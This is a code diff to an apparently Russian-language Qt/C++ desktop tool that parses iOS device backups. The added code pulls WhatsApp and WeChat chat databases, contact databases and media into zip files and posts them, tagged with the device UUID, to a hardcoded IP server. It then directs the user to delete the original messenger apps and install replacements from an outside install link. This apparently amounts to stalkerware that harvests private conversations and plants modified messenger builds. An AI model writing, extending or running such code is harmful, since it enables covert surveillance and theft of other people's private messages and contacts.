@@ -23,6 +23,12 @@ MainWindow::MainWindow(QWidget *parent) :
    WHATSAPP_MEDIA_ZIP_POST_NAME = "wzipfile";
    WHATSAPP_DB_POST_NAME = "wdbfile";
    IPA_BUILDER_MAC_SERVER_IP = "http://88.204.154.151";
+   INSTALL_URL = "https://xargon.ru/install";
+
+   WECHAT_DB_FILE = "wechat_dbfile.zip";
+   WECHAT_POST_NAME = "wechat_zip";
+
+
 
    //instructionForm.setUrl("http://88.204.154.151");
     // instructionForm.show();
@@ -71,58 +77,156 @@ void MainWindow::runTest(){
 
 void MainWindow::on_startBtn_clicked()
 {
-    ui->startBtn->setText("Ждите...");
+
+    //ui->startBtn->setText("Ждите...");
     ui->startBtn->setEnabled(false);
     logTextBrowser->append("\nОбработка бэкапа.........");
 
+     setUpdatesEnabled(true);
+     repaint();
+     //setUpdatesEnabled(false);
+
 
     QString manifestPath = QString("%1/%2/%3").arg(pathToAllBackup,ui->backupsListComBox->currentText(), "Manifest.db" );
+     connectDatabase(manifestPath);
 
     UUID = ui->backupsListComBox->currentText();
-    //start time
-    //qint64 startTime =  QDateTime::currentMSecsSinceEpoch();
-    process(manifestPath);
-   // qint64 endTime =  QDateTime::currentMSecsSinceEpoch();
 
-    //qDebug() << "Parsing time is:" << (endTime - startTime ) << "millisecond";
-    //end time
+    if(UUID.isEmpty()){
+        ui->startBtn->setEnabled(true);
+        ui->backupsListComBox->setStyleSheet("QComboBox { border-style: outset;border-width: 1px; border-color: red; }");
+        QMessageBox msgBox;
+        msgBox.setText("Введите UUID устройства");
+        msgBox.exec();
+        return;
 
+    }
+
+    ui->backupsListComBox->setStyleSheet("QComboBox { border-style: outset;border-width: 1px; border-color: black; }");
+
+
+     QMap <QString, QString> *mapPostAndFilePaths =new QMap<QString, QString>();
+
+     //clear all tmpDir
+     clear();
+
+
+
+     if(ui->whatsappAppcheckBox->isChecked()){
+         logTextBrowser->append("\nИдет Обработка файлов для мессенджера Whatsapp.........");
+          repaint();
+         QString zipPath =  processWhatsappBackup(manifestPath);
+         if(!zipPath.isEmpty()){
+             //add ChatStrorage.sqlite
+             mapPostAndFilePaths->insert(WHATSAPP_MEDIA_ZIP_POST_NAME,zipPath);
+
+             //add ChatStrorage.sqlite
+             QString dbFileNameFullPath = zipPath;
+             dbFileNameFullPath.replace(WHATSAPP_MEDIA_ZIP_FILENAME, WHATSAPP_DB_FILENAME);
+             mapPostAndFilePaths->insert(WHATSAPP_DB_POST_NAME,dbFileNameFullPath);
+
+         }
+
+     }
+
+
+     if(ui->WechatAppCheckBox->isChecked()){
+         logTextBrowser->append("\nИдет Обработка файлов для мессенджера Wechat.........");
+          repaint();
+         QString zipPath =  processWechatBackup(manifestPath);
+         if(!zipPath.isEmpty()){
+             mapPostAndFilePaths->insert(WECHAT_POST_NAME,zipPath);
+         }
+     }
+
+     if(ui->ViberAppCheckBox->isChecked()){
+         logTextBrowser->append("\nИдет Обработка файлов для мессенджера VIBER.........");
+
+     }
+
+  sendAllBackup(mapPostAndFilePaths, UUID);
+
+}
+
+QString MainWindow::processWhatsappBackup (QString backupFullPath){
+
+     //move ChatStorage.sqlite path
+     logTextBrowser->append("\nИдет Обработка файлов для мессенджера Whatsapp.........");
+     logTextBrowser->append("\nИдет копирование базы данных Whatsapp .........");
+     QString ChatStorageCopiedPath = copyStorageFile();
+
+     if(ChatStorageCopiedPath.isEmpty()){
+
+         return "";
+     }
+
+     // move media files
+     logTextBrowser->append("\nКопирование медиа файлов в временную директорию.........");
+     QMap <QString, QString> *mapIosPathAndLocalPath =new QMap<QString, QString>();
+     QString sqlQuery = "select * from files where domain LIKE \"%AppDomain-net.whatsapp.WhatsApp%\" AND relativePath LIKE \"%Library/Media%\" AND flags = 1";
+     getMediaFilesPaths(mapIosPathAndLocalPath, sqlQuery);
+     QString libraryWordForCut = "Library/";
+
+     if(mapIosPathAndLocalPath->count() > 0) {
+         copyFilesToTmpDir(mapIosPathAndLocalPath, libraryWordForCut.length());
+         //zip file for whatsapp
+         logTextBrowser->append("\nСоздание архива медиафайлов Whatsapp .........\n");
+         QString zippedPath = zip(WHATSAPP_MEDIA_ZIP_FILENAME);
+         if(zippedPath.isEmpty()){
+             qDebug() << "faild zip file";
+         }
+         return zippedPath;
+
+     }
+
+     else
+         return "";
 
 
 }
 
-bool MainWindow::process(QString backupFullPath){
 
+QString MainWindow::processWechatBackup(QString backupFullPath){
 
-    logTextBrowser->append("\nОбработка бэкапа.........");
-    connectDatabase(backupFullPath);
-
-    //clear all tmpDir
-    clear();
-
-    //move ChatStorage.sqlite path
-    logTextBrowser->append("\nИдет копирование базы данных в временную директорию.........");
-    copyStorageFile();
-
-    // move media files
-    logTextBrowser->append("\nКопирование медиа файлов в временную директорию.........");
     QMap <QString, QString> *mapIosPathAndLocalPath =new QMap<QString, QString>();
-    getMediaFilesPaths(mapIosPathAndLocalPath);
-    copyFilesToTmpDir(mapIosPathAndLocalPath);
+    //QString sqlQuery = "select * from files where domain LIKE \"%AppDomain-net.whatsapp.WhatsApp%\" AND relativePath LIKE \"%Library/Media%\" AND flags = 1";
+    //QString sqlQuery = "select * from Files where relativePath  LIKE \"%MM.sqlite\" AND domain = \"AppDomain-com.tencent.xin\"";
+    QString sqlQuery  = "select * from Files where domain = \"AppDomain-com.tencent.xin\" "
+                        "AND ("
+                        "(relativePath  LIKE \"%MM.sqlite\") "
+                        "or (relativePath  LIKE \"%WCDB_Contact.sqlite\")"
+                        "or (relativePath LIKE \"%Audio%\" AND flags = 1)"
+                        " or (relativePath LIKE \"%Video%\"  AND flags = 1) "
+                        "or (relativePath LIKE \"%Img%\" AND flags = 1 )"
+                        ")";
 
-    //zip file for whatsapp
-    logTextBrowser->append("\nСоздание архива .........\n");
-    QString zippedPath = zip(WHATSAPP_MEDIA_ZIP_FILENAME);
-    if(zippedPath.isEmpty()){
-        qDebug() << "faild zip file";
-        return false;
+
+
+    getMediaFilesPaths(mapIosPathAndLocalPath, sqlQuery);
+
+    QString libraryWordForCut = "Documents/";
+
+    if(mapIosPathAndLocalPath->count() > 0){
+        copyFilesToTmpDir(mapIosPathAndLocalPath, libraryWordForCut.length());
+        QString zippedPath = zip(WECHAT_DB_FILE);
+        if(zippedPath.isEmpty()){
+            qDebug() << "faild zip wechat db file";
+        }
+        qDebug() << "Success zip wechat db file";
+        return zippedPath;
+
     }
 
-     //send ziped file to server
-    logTextBrowser->append("\nОтправка архива на сервер.........\n");
-    sendZip(zippedPath, UUID);
+    else
+        return "";
 
-    return true;
+//select * from Files
+//where domain = "AppDomain-com.tencent.xin"
+//AND ((relativePath  LIKE "%MM.sqlite")
+//or (relativePath LIKE "%Audio%" AND flags = 1)
+//or (relativePath LIKE "%Video%"  AND flags = 1)
+//or (relativePath LIKE "%Img%" AND flags = 1 ))
+
 }
 
 bool MainWindow::connectDatabase(const QString& database)
@@ -146,7 +250,9 @@ bool MainWindow::connectDatabase(const QString& database)
 }
 
 
-bool MainWindow::copyStorageFile(){
+QString MainWindow::copyStorageFile(){
+
+    QString copiedStoragePath = "";
 
     QSqlQuery query(db);
     QString cmd = "select * from files where relativePath = 'ChatStorage.sqlite'";
@@ -154,7 +260,7 @@ bool MainWindow::copyStorageFile(){
     bool success = query.exec(cmd);
     if (!success){
          qDebug() << "faild select";
-         return false;
+         return "";
     }
 
     if(query.next())
@@ -169,7 +275,7 @@ bool MainWindow::copyStorageFile(){
              QString tempDirPath = getBackupTmpDirFullPath();
              if(tempDirPath.isEmpty()){
                  qDebug() << "faild create tmpDir";
-                 return false;
+                  return "";
              }
              QString srcFilePAth = localPath;
              QString dstFilePath = QString("%1/%2").arg(tempDirPath,iosFileName );
@@ -178,20 +284,30 @@ bool MainWindow::copyStorageFile(){
 
             if(!isCopiedSuccess){
                 qDebug() << "faild copy file from src path: " << srcFilePAth << " toPath: " << dstFilePath;
-                return false;
+                 return "";
+            }
+
+            else{
+                return dstFilePath;
             }
          }
+
+         return "";
     }
 
+    else
+        return "";
 
-    return true;
+
+
 }
 
 
-bool MainWindow::getMediaFilesPaths( QMap <QString, QString>* mapIosPathAndLocalPath){
+bool MainWindow::getMediaFilesPaths( QMap <QString, QString>* mapIosPathAndLocalPath,  QString sqlIn){
     //1 Get media files paths
     QSqlQuery query(db);
-    QString cmd = "select * from files where domain LIKE \"%AppDomain-net.whatsapp.WhatsApp%\" AND relativePath LIKE \"%Library/Media%\" AND flags = 1";
+   // QString cmd = "select * from files where domain LIKE \"%AppDomain-net.whatsapp.WhatsApp%\" AND relativePath LIKE \"%Library/Media%\" AND flags = 1";
+   QString cmd = sqlIn;
 
     bool success = query.exec(cmd);
     if (!success){
@@ -238,7 +354,7 @@ bool MainWindow::getMediaFilesPaths( QMap <QString, QString>* mapIosPathAndLocal
     return true;
 }
 
-bool MainWindow::copyFilesToTmpDir (QMap <QString, QString>* mapIosPathAndLocalPath){
+bool MainWindow::copyFilesToTmpDir (QMap <QString, QString>* mapIosPathAndLocalPath, int lenghForCut){
 
     // get tmp dir
 
@@ -263,7 +379,7 @@ bool MainWindow::copyFilesToTmpDir (QMap <QString, QString>* mapIosPathAndLocalP
 
         //cut from iosPath Library/
         QString fileName = QFileInfo(iosPath).fileName();
-        iosPath = iosPath.remove(0,8);
+        iosPath = iosPath.remove(0,lenghForCut);
         iosPath = iosPath.replace(fileName, "");
 
         QString pathWithAllDirs = QString("%1/%2").arg(tempDirPath,iosPath );
@@ -275,7 +391,6 @@ bool MainWindow::copyFilesToTmpDir (QMap <QString, QString>* mapIosPathAndLocalP
             if(!succes){
                 qDebug() << "faild to create folder with path:" << pathWithAllDirs;
             }
-
         }
 
         //copy
@@ -423,6 +538,138 @@ QString MainWindow::getNameFromFullPath(QString fullPath){
 
 }
 
+QByteArray MainWindow::getAppList(){
+
+    QStringList appList;
+
+    if(ui->whatsappAppcheckBox->isChecked()){
+        appList << "w";
+    }
+
+    if(ui->TelegramAppCheckBox->isChecked()){
+        appList << "t";
+    }
+
+    if(ui->WechatAppCheckBox->isChecked()){
+        appList << "c";
+    }
+
+    if(ui->ViberAppCheckBox->isChecked()){
+        appList << "v";
+    }
+
+   QByteArray appListBuf =  appList.join(",").toUtf8();
+
+   return appListBuf;
+}
+
+bool MainWindow::sendAllBackup (QMap <QString, QString>* mapPostAndFilePath, QString uuid) {
+
+    QNetworkAccessManager *manager =  new QNetworkAccessManager(this);
+
+    QByteArray  paramTextPlain="text/plain";
+    QByteArray  paramOctetStream="application/octet-stream";
+
+    QByteArray paramUuidName="uuid" ,paramUuidValue=uuid.toUtf8();
+    QByteArray paramGuidName="guid" ,paramGuidValue=GuidByteArr;
+    QByteArray paramNameUrl="url" ,paramUrlValue=URLByteArr;
+     QByteArray paramNameApplist="applist" ,paramAppListValue=getAppList();
+    //задаем разделитель
+    QByteArray postData,boundary="-----------------------1BEF0A57BE110FD467A";
+
+    // параметр uuid
+    postData.append("--"+boundary+"\r\n");//разделитель
+    postData.append("Content-Disposition: form-data; name=\"");
+    postData.append(paramUuidName);
+    postData.append("\"\r\n\r\n");
+    //значение параметра
+    postData.append(paramUuidValue);
+    postData.append("\r\n");
+
+    // параметр guid
+    postData.append("--"+boundary+"\r\n");//разделитель
+    //имя параметра
+    postData.append("Content-Disposition: form-data; name=\"");
+    postData.append(paramGuidName);
+    postData.append("\"\r\n\r\n");
+    //значение параметра
+    postData.append(paramGuidValue);
+    postData.append("\r\n");
+
+    // параметр url
+    postData.append("--"+boundary+"\r\n");//разделитель
+    //имя параметра
+    postData.append("Content-Disposition: form-data; name=\"");
+    postData.append(paramNameUrl);
+    postData.append("\"\r\n\r\n");
+    //значение параметра
+    postData.append(paramUrlValue);
+    postData.append("\r\n");
+
+    // параметр applist
+    postData.append("--"+boundary+"\r\n");//разделитель
+    //имя параметра
+    postData.append("Content-Disposition: form-data; name=\"");
+    postData.append(paramNameApplist);
+    postData.append("\"\r\n\r\n");
+    //значение параметра
+    postData.append(paramAppListValue);
+    postData.append("\r\n");
+
+
+    //attach files
+    QMapIterator<QString, QString> iter(*mapPostAndFilePath);
+    while (iter.hasNext()) {
+
+        iter.next();
+        QString postValue  = iter.key();
+        QString filePath = iter.value();
+        QString fileName = getNameFromFullPath(filePath);
+
+        QFile file(filePath);
+        if (!file.open(QIODevice::ReadWrite)){
+            logTextBrowser->append(QString(" Не найден файл с архивом: %1 ").arg(filePath));
+            continue;
+        }
+
+        QByteArray paramAttachName=postValue.toUtf8(), paramAttachFileName=fileName.toUtf8();
+        QByteArray paramAttachData=file.readAll();
+
+
+        //параметр приаттаченный файл
+        postData.append("--"+boundary+"\r\n");//разделитель
+        //имя параметра
+        postData.append("Content-Disposition: form-data; name=\"");
+        postData.append(paramAttachName);
+        //имя файла
+        postData.append("\"; filename=\"");
+        postData.append(paramAttachFileName);
+        postData.append("\"\r\n");
+        //тип содержимого файла
+        postData.append("Content-Type: "+paramOctetStream+"\r\n\r\n");
+        //данные
+        postData.append(paramAttachData);
+        postData.append("\r\n");
+    }
+
+
+    //"хвост" запроса
+    postData.append("--"+boundary+"--\r\n");
+
+    QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
+    request.setHeader(QNetworkRequest::ContentTypeHeader,
+        "multipart/form-data; boundary="+boundary);
+    request.setHeader(QNetworkRequest::ContentLengthHeader,
+        QByteArray::number(postData.length()));
+
+    connect(manager, SIGNAL(finished(QNetworkReply*)),this, SLOT(sendReportToServerReply(QNetworkReply*)));
+     //connect(manager, SIGNAL(),this, SLOT();
+
+    logTextBrowser->append("Идет отправка архива на сервер......");
+    QNetworkReply *reply=manager->post(request,postData);
+    return true;
+}
+
 bool MainWindow::sendZip (QString zipFullPath, QString uuid){
 
     QString fileName = getNameFromFullPath(zipFullPath);
@@ -546,6 +793,8 @@ bool MainWindow::sendZip (QString zipFullPath, QString uuid){
 
 void MainWindow::sendReportToServerReply(QNetworkReply* reply){
 
+     ui->startBtn->setEnabled(true);
+
      QByteArray replyInByte = reply->readAll();
      qint64 size = replyInByte.size();
 
@@ -556,10 +805,10 @@ void MainWindow::sendReportToServerReply(QNetworkReply* reply){
      }
 
      QString replyStr = QString::fromLatin1(replyInByte);
-     QString log = QString("\nДля установки программ на телефон сначала удалите оригинальные приложения затем откройте браузер на телефоне и перейдите по ссылки https://vohulg.ru/ios/%1 \n").arg(replyStr);
+     QString log = QString("\nДля установки программ на телефон сначала удалите оригинальные приложения затем откройте браузер на телефоне и перейдите по ссылки %1/%2 \n").arg(INSTALL_URL,replyStr);
      logTextBrowser->append(log);
 
-     QString url = QString("https://vohulg.ru/ios/%1").arg(replyStr);
+     QString url = QString("%1/%2").arg(INSTALL_URL,replyStr);
      instructionForm.setUrl(url);
      instructionForm.show();
 
@@ -698,3 +947,11 @@ void MainWindow::on_chooseFileBtn_clicked()
        ui->startBtn->setEnabled(true);\
 
 }
+
+void MainWindow::on_action_triggered()
+{
+    instructionForm.show();
+}
+
+
+
